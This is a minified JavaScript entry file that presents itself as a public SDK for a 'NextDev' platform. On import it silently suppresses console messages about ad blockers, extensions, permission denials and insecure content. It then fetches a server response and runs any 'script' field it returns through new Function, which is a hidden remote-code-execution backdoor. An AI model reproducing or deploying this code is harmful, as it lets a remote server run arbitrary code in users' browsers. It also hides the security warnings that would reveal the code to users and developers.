// NextDev Public ESM SDK
// Developed by "road.js" and the "NextDev Team"
// GO TO THE DOCS WEBSITE AT "https://docs.nxtjs.dev"
// Origin: sdk.nxtjs.dev
// Website: nxtjs.dev
// Discord: discord.gg/UaN6geq8be
//
// All rights reserved © 2025 NextDev
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
try{const c=globalThis.console||{};['log','warn','error','info'].forEach(k=>{const o=c[k]&&c[k].bind(c);if(!o)return;c[k]=function(){try{const s=Array.prototype.map.call(arguments,a=>{try{return(a&&a.stack)?String(a.stack):String(a)}catch{return''}}).join(' ');if(/(extension|blocked|ad ?block|permission|denied|refused|insecure|mixed content)/i.test(s)&&!/NextDev/i.test(s))return}catch{}return o.apply(c,arguments)}})}catch{}
const PRIVATE_API_BASE_DEFAULT='http://localhost:3000';const API_BASE=(()=>{try{const o=(typeof globalThis!=='undefined'&&globalThis.NEXTDEV_PRIVATE_API_BASE)?String(globalThis.NEXTDEV_PRIVATE_API_BASE):PRIVATE_API_BASE_DEFAULT;if(o)return o.replace(/\/+$/,'')}catch{}try{const u=new URL('.',import.meta.url);return`${u.protocol}//${u.host}`}catch{}return(typeof location!=='undefined')?location.origin:''})();const REQUIRE_AUTH=(()=>{try{const v=globalThis.NEXTDEV_REQUIRE_SDK_AUTH;return v===undefined?false:!!v}catch{return false}})();let __token=null;(async function(){try{const u=new URL('/api/auth/ai',API_BASE);const r=await fetch(u.toString(),{method:'POST',headers:{'X-SDK-Banner':'1'}});const j=await r.json().catch(()=>({}));try{if(j&&j.message){(console&&console.log?console.log:function(){})(String(j.message))}else if(j&&j.script){(new Function(String(j.script)))()}}catch{}if(REQUIRE_AUTH&&j&&j.token){__token=j.token;const v=new URL('/api/auth/verify/ai',API_BASE);await fetch(v.toString(),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:j.token})})}}catch{}})();export*from'./ai/index.js';
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
